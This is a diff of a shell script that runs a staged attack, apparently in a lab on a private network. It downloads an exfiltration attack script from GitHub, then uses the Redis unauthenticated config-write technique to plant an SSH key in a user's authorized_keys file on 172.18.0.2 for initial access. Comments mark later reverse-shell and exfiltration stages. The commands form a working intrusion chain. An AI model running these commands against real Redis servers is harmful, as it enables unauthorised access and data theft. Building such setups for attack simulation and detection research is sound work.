@@ -16,7 +16,7 @@ sudo apt -y install make gcc
 sudo apt install redis -y
 sudo apt install nmap -y
 
-cd ~ && wget https://github.com/S692/ossas/blob/main/attackScripts/exfiltration_attk.sh && chmod +x exfiltration_attk.sh
+cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh && chmod +x exfiltration_attk.sh
 
 # [Initial access] Automated
 cd ~
@@ -25,6 +25,7 @@ ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
 cd .ssh
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
 cat 1.txt | redis-cli -h 172.18.0.2 -x set sshkey
+sleep 5
 printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authorized_keys'\nsave\nexit" | redis-cli -h 172.18.0.2
 
 # [Initial acccess] Reverse Shell
@@ -32,7 +33,8 @@ printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authoriz
 
 # [Initial access] Setup download scripts
 # Will be in /home/resch on the target
-# wget https://github.com/S692/ossas/blob/main/attack_scripts_download.sh && chmod +x attack_scripts_download.sh
+# wget https://raw.githubusercontent.com/S692/ossas/main/attack_scripts_download.sh && chmod +x attack_scripts_download.sh
+# chmod +x attack_scripts_download.sh
 # ./attack_scripts_download.sh
 
 # [Exfiltration] Open another terminal and run as root:
